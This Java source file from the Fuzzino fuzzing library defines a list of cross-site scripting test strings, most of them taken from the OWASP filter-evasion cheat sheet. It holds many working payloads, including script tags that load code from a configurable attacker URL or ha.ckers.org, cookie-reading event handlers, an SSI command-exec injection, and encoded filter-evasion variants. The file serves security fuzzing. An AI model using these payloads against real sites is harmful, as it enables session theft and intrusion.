//   Copyright 2012-2013 Fraunhofer FOKUS
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
package de.fraunhofer.fokus.fuzzing.fuzzino.heuristics.generators.string.data;

/**
 * Only Contains Strings that have no linebreaks.
 * @author ble
 *
 */
public class XSSBasicInputStrings extends StringContainer {

	private String attackerURL;
	
	public XSSBasicInputStrings(String attackerURL){
		super();
		this.attackerURL = attackerURL;
		initMyValues();
	}
	
	protected void initMyValues() {
		//TODO: maybe make the hardcoded javascript function call (mostly alert) dynamic?
		//Strings are taken from https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
		add("'';!--\"<XSS>=&{()}");
		add("<SCRIPT SRC=" + attackerURL + "></SCRIPT>");
		add("<IMG SRC=\"javascript:alert('XSS');\">");
		add("<IMG SRC=javascript:alert('XSS')>");
		add("<IMG SRC=JaVaScRiPt:alert('XSS')>");
		add("<IMG SRC=javascript:alert(\"XSS\")>");
		add("<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>");
		add("<a onmouseover=\"alert(document.cookie)\">xxs link</a> ");
		add("<a onmouseover=alert(document.cookie)>xxs link</a> ");
		add("<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">");
		add("<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>");
		add("<IMG SRC=# onmouseover=\"alert('xxs')\">");
		add("<IMG SRC= onmouseover=\"alert('xxs')\">");
		add("<IMG onmouseover=\"alert('xxs')\">");
		add("<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>");
		add("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>");
		//the \t in the following is intended since it is the java coding of a tab
		add("<IMG SRC=\"jav\tascript:alert('XSS');\">");
		add("<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">");
		add("<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">");
		add("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">");
		add("perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out");
		add("<IMG SRC=\" &#14;  javascript:alert('XSS');\">");
		add("<SCRIPT/XSS SRC=\"" + attackerURL + "\"></SCRIPT>");
		add("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>");
		add("<SCRIPT/SRC=\"" + attackerURL + "\"></SCRIPT>");
		add("<<SCRIPT>alert(\"XSS\");//<</SCRIPT>");
		add("<SCRIPT SRC=" + attackerURL + "?< B >");
		//TODO: externer http link? .j gehört dazu?
		add("<SCRIPT SRC=//ha.ckers.org/.j>");
		add("<IMG SRC=\"javascript:alert('XSS')\"");
		//TODO: externer http link?
		add("<iframe src=" + attackerURL + " <");
		add("\\\";alert('XSS');//");
		add("</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>");
		add("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">");
		add("<BODY BACKGROUND=\"javascript:alert('XSS')\">");
		add("<IMG DYNSRC=\"javascript:alert('XSS')\">");
		add("<IMG LOWSRC=\"javascript:alert('XSS')\">");
		add("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>");
		add("<IMG SRC='vbscript:msgbox(\"XSS\")'>");
		add("<IMG SRC=\"livescript:[code]\">");
		add("<BGSOUND SRC=\"javascript:alert('XSS');\">");
		add("<BR SIZE=\"&{alert('XSS')}\">");
		add("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">");
		//TODO: externer http link? - .css file anders als bestehender Link - neuer parameter?
		add("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">");
		add("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>");
		add("<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">");
		add("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>");
		add("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>");
		add("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">");
		add("<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>");
		add("<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>");
		add("<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>");
		add("<XSS STYLE=\"xss:expression(alert('XSS'))\">");
		add("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">");
		add("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">");
		add("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">");
		add("<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>");
		//TODO: on Mouseover durch event Combinator mit anderen events ersetzen
		add("<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>");
		add("<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>");
		add("<TABLE BACKGROUND=\"javascript:alert('XSS')\">");
		add("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">");
		add("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">");
		add("<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">");
		//TODO: fuzzen nach beschreibung auf der seite
		add("<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">");
		add("<BASE HREF=\"javascript:alert('XSS');//\">");
		add("<BASE HREF=\"javascript:alert('XSS');/\">");
		add("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"" + attackerURL + "\"></OBJECT>");
		add("<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>");
		add("<SCRIPT SRC=\"" + attackerURL + "\"></SCRIPT>");
		add("<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=" + attackerURL + "></SCRIPT>'\"-->");
		add("<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">");
		add(" <HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-");
		add("<SCRIPT a=\">\" SRC=\"" + attackerURL + "\"></SCRIPT>");
		add("<SCRIPT =\">\" SRC=\"" + attackerURL + "\"></SCRIPT>");
		add("<SCRIPT a=\">\" '' SRC=\"" + attackerURL + "\"></SCRIPT>");
		add("<SCRIPT \"a='>'\" SRC=\"" + attackerURL + "\"></SCRIPT>");
		add("<SCRIPT a=`>` SRC=\"" + attackerURL + "\"></SCRIPT>");
		add("<SCRIPT a=\">'>\" SRC=\"" + attackerURL + "\"></SCRIPT>");
		add("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"" + attackerURL + "\"></SCRIPT>");		
		//Next one was multiple lines but it is probably irrelevant
		add("<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert(\"XSS\")</SCRIPT>\"></BODY></HTML>");
		//Next Strings are from http://airodump.net/xss-pentest-plugin-cross-site-scripting/
		add("<IMG SRC=” &#14; javascript:document.vulnerable=true;”>");
		add("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.vulnerable=true;>");
		add("<SCRIPT <B>document.vulnerable=true;</SCRIPT>");
		add("<iframe src=”javascript:document.vulnerable=true;");
		add("\\”;document.vulnerable=true;;//");
		add("<INPUT TYPE=”IMAGE” SRC=”javascript:document.vulnerable=true;”>");
		add("<BODY BACKGROUND=”javascript:document.vulnerable=true;”>");
		add("<IMG DYNSRC=”javascript:document.vulnerable=true;”>");
		add("<IMG LOWSRC=”javascript:document.vulnerable=true;”>");
		add("<BGSOUND SRC=”javascript:document.vulnerable=true;”>");
		add("<BR SIZE=”&{document.vulnerable=true}”>");
		add("<LAYER SRC=”javascript:document.vulnerable=true;”></LAYER>");
		add("<STYLE>li {list-style-image: url(“javascript:document.vulnerable=true;”);</STYLE><UL><LI>XSS");
		add("1/4script3/4document.vulnerable=true;1/4/script3/4");
		add("<META HTTP-EQUIV=”refresh” CONTENT=”0;url=javascript:document.vulnerable=true;”>");
		add("<META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:document.vulnerable=true;”>");
		add("<FRAMESET><FRAME SRC=”javascript:document.vulnerable=true;”></FRAMESET>");
		add("<TABLE BACKGROUND=”javascript:document.vulnerable=true;”>");
		add("<TABLE><TD BACKGROUND=”javascript:document.vulnerable=true;”>");
		add("<DIV STYLE=”width: expression(document.vulnerable=true);”><STYLE>@im\\port’\\ja\\vasc\\ript:document.vulnerable=true’;</STYLE>");
		add("<IMG STYLE=”xss:expr/*XSS*/ession(document.vulnerable=true)”>");
		add("<XSS STYLE=”xss:expression(document.vulnerable=true)”>");
		add("exp/*<A STYLE=’no\\xss:noxss(“*//*”);xss:ex/*XSS*//*/*/pression(document.vulnerable=true)’>");
		add("<STYLE TYPE=”text/javascript”>document.vulnerable=true;</STYLE>");
		add("<STYLE>.XSS{background-image:url(“javascript:document.vulnerable=true”);}</STYLE><A CLASS=XSS></A>");
		add("<STYLE type=”text/css”>BODY{background:url(“javascript:document.vulnerable=true”)}</STYLE>");
		add("<!–[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]–>");
		add("<BASE HREF=”javascript:document.vulnerable=true;//”>");
		add("<? echo(‘<SCR)’;echo(‘IPT>document.vulnerable=true</SCRIPT>’); ?>");
		add("<a href=”javascript#document.vulnerable=true;”>");
		add("<div onmouseover=”document.vulnerable=true;”>");
		add("<img dynsrc=”javascript:document.vulnerable=true;”>");
		add("<input type=”image” dynsrc=”javascript:document.vulnerable=true;”>");
		add("<bgsound src=”javascript:document.vulnerable=true;”>");
		add("&<script>document.vulnerable=true;</script>");
		add("&{document.vulnerable=true;};");
		add("<img src=&{document.vulnerable=true;};>");
		add("<img src=”mocha:document.vulnerable=true;”>");
		add("<img src=”livescript:document.vulnerable=true;”>");
		add("<a href=”about:<script>document.vulnerable=true;</script>”>");
		add("<meta http-equiv=”refresh” content=”0;url=javascript:document.vulnerable=true;”>");
		add("<body onload=”document.vulnerable=true;”>");
		add("<div style=”behaviour: url([link to code]);”>");
		add("<div style=”binding: url([link to code]);”>");
		add("<div style=”width: expression(document.vulnerable=true;);”>");
		add("<style type=”text/javascript”>document.vulnerable=true;</style>");
		add("<object classid=”clsid:…” codebase=”javascript:document.vulnerable=true;”>");
		add("<style><!–</style><script>document.vulnerable=true;//–></script>");
		add("<<script>document.vulnerable=true;</script>");
		add("<![CDATA[<!--]]<script>document.vulnerable=true;//–></script>");
		add("<!– — –><script>document.vulnerable=true;</script><!– — –>");
		add("<xml src=”javascript:document.vulnerable=true;”>");
		add("<xml id=”X”><a><b><script>document.vulnerable=true;</script>;</b></a></xml>");
		add("<div datafld=”b” dataformatas=”html” datasrc=”#X”></div>");
		add("[\\xC0][\\xBC]script>document.vulnerable=true;[\\xC0][\\xBC]/script>");
		add("<META HTTP-EQUIV=”Set-Cookie” Content=”USERID=<SCRIPT>document.vulnerable=true</SCRIPT>”>");
		add("<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></OBJECT>");
		add("<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]<![CDATA[cript:document.vulnerable=true;\">]]</C><X></xml>");
		add("<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>");
		add("<XML ID=”xss”><I><B><IMG SRC=”javas<!—->cript:document.vulnerable=true”></B></I><XML><SPAN DATASRC=“#xss”DATAFLD=”B” DATAFORMATAS=”HTML”></SPAN>");	
	}

	@Override
	protected void initValues() {
		//nothing to do here
	}
}
